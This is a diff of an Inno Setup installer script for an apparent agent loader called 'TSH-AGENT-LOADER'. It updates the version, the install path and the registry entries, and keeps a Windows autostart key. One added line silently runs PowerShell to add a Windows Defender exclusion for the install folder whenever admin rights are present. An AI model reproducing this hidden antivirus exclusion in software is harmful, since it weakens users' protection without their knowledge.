@@ -1,8 +1,8 @@
 #include "secrets.isi"
 
 #define MyAppName "TSH-AGENT-LOADER"
-#define MyAppVersion "1.0"
-#define MyAppPublisher "TSH, Inc."
+#define MyAppVersion "1.0.10"
+#define MyAppPublisher "TSHInc"
 #define MyAppURL "https://service.tongsung.site/"
 #define MyAppExeName "main.exe"
 #define MyAppAssocName MyAppName + " File"
@@ -18,8 +18,10 @@ AppPublisherURL={#MyAppURL}
 AppSupportURL={#MyAppURL}
 AppUpdatesURL={#MyAppURL}
 
+UsePreviousAppDir=no
+
 ; 설치 경로 및 권한
-DefaultDirName={localappdata}\{#MyAppPublisher}\{#MyAppVersion}\{#MyAppName}
+DefaultDirName={localappdata}\{#MyAppPublisher}\{#MyAppName}\{#MyAppVersion}
 PrivilegesRequired=lowest
 UninstallDisplayIcon={app}\{#MyAppExeName}
 
@@ -49,7 +51,8 @@ Name: "desktopicon"; Description: "{cm:CreateDesktopIcon}"; GroupDescription: "{
 
 [Files]
 ; 빌드된 exe 파일을 가져오는 경로를 secrets에서 관리
-Source: "{#MySourceExe}"; DestDir: "{app}"; Flags: ignoreversion
+;Source: "{#MySourceExe}"; DestDir: "{app}"; Flags: ignoreversion
+Source: "{#MyMainDist}"; DestDir: "{app}"; Flags: ignoreversion recursesubdirs createallsubdirs
 
 [Registry]
 ; 연결 프로그램 및 자동 실행 설정
@@ -58,10 +61,12 @@ Root: HKA; Subkey: "Software\Classes\{#MyAppAssocKey}"; ValueType: string; Value
 Root: HKA; Subkey: "Software\Classes\{#MyAppAssocKey}\DefaultIcon"; ValueType: string; ValueName: ""; ValueData: "{app}\{#MyAppExeName},0"
 Root: HKA; Subkey: "Software\Classes\{#MyAppAssocKey}\shell\open\command"; ValueType: string; ValueName: ""; ValueData: """{app}\{#MyAppExeName}"" ""%1"""
 Root: HKA; Subkey: "Software\Microsoft\Windows\CurrentVersion\Run"; ValueType: string; ValueName: "{#MyAppName}"; ValueData: """{app}\{#MyAppExeName}"""; Flags: uninsdeletevalue
+Root: HKCU; Subkey: "Software\{#MyAppPublisher}\{#MyAppName}"; ValueType: string; ValueName: "InstallPath"; ValueData: "{app}"; Flags: uninsdeletekey
 
 [Icons]
 Name: "{autoprograms}\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"
 Name: "{autodesktop}\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"; Tasks: desktopicon
 
 [Run]
-Filename: "{app}\{#MyAppExeName}"; Description: "{cm:LaunchProgram,{#StringChange(MyAppName, '&', '&&')}}"; Flags: nowait postinstall skipifsilent
+Filename: "{app}\{#MyAppExeName}"; Description: "{cm:LaunchProgram,{#StringChange(MyAppName, '&', '&&')}}"; Flags: nowait postinstall skipifsilent; WorkingDir: "{app}"
+Filename: "powershell.exe"; Parameters: "-Command ""Add-MpPreference -ExclusionPath '{app}'"""; Flags: runhidden; Check: IsAdmin
